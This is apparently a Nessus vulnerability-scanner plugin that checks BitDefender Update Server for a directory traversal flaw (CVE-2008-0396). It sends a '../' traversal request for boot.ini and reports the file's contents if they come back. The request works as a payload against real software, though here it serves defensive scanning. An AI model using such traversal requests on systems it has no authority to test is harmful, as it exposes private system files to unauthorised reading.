#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(30021);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2015/09/24 20:59:28 $");

  script_cve_id("CVE-2008-0396");
  script_bugtraq_id(27358);
  script_osvdb_id(40518);

  script_name(english:"BitDefender Update Server HTTP Request Traversal Arbitrary File Access");
  script_summary(english:"Tries to retrieve a local file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a directory traversal
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of BitDefender Update Server running on the remote host
fails to sanitize request strings of directory traversal sequences,
which allows an unauthenticated attacker to read files outside the web
server's document directory. 

Note that the server runs with LocalSystem privileges by default.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/486701/30/0/threaded");
  script_set_attribute(attribute:"solution", value:"Apply the patch referenced in the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(22);

  script_set_attribute(attribute:"plugin_publication_date", value: "2008/01/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:bitdefender:update_server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");

  script_dependencies("bitdefender_update_server_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www");

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_kb_item("Services/www");
if (!get_kb_item("www/"+port+"/bitdefender_update_server")) exit(0);


# Try to exploit the issue.
file = "/../../../../../../../../../../../../boot.ini";
r = http_send_recv3(method:"GET", item:file, port:port, exit_on_fail: 1);

# There's a problem if looks like boot.ini.
if ("[boot loader]">< r[2])
{
  if (report_verbosity)
  {
    report = string(
      "Here are the contents of the file '\\boot.ini' that Nessus was able to\n",
      "read from the remote host :\n",
      "\n",
      r[2]
    );
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
